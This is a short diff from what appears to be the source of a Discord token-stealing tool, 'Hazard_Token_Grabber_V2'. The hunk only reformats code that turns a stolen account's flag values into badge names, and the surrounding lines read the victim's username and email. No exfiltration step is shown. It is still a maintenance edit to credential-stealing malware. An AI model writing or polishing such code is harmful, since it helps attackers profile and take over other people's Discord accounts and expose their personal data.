@@ -247,28 +247,17 @@ class Hazard_Token_Grabber_V2:
 
                                 badges = ""
                                 flags = j['flags']
-                                if (flags == 1):
-                                    badges += "Staff, "
-                                if (flags == 2):
-                                    badges += "Partner, "
-                                if (flags == 4):
-                                    badges += "Hypesquad Event, "
-                                if (flags == 8):
-                                    badges += "Green Bughunter, "
-                                if (flags == 64):
-                                    badges += "Hypesquad Bravery, "
-                                if (flags == 128):
-                                    badges += "HypeSquad Brillance, "
-                                if (flags == 256):
-                                    badges += "HypeSquad Balance, "
-                                if (flags == 512):
-                                    badges += "Early Supporter, "
-                                if (flags == 16384):
-                                    badges += "Gold BugHunter, "
-                                if (flags == 131072):
-                                    badges += "Verified Bot Developer, "
-                                if (badges == ""):
-                                    badges = "None"
+                                if (flags == 1): badges += "Staff, "
+                                if (flags == 2): badges += "Partner, "
+                                if (flags == 4): badges += "Hypesquad Event, "
+                                if (flags == 8): badges += "Green Bughunter, "
+                                if (flags == 64): badges += "Hypesquad Bravery, "
+                                if (flags == 128): badges += "HypeSquad Brillance, "
+                                if (flags == 256): badges += "HypeSquad Balance, "
+                                if (flags == 512): badges += "Early Supporter, "
+                                if (flags == 16384): badges += "Gold BugHunter, "
+                                if (flags == 131072): badges += "Verified Bot Developer, "
+                                if (badges == ""): badges = "None"
 
                                 user = j["username"] + "#" + str(j["discriminator"])
                                 email = j["email"]
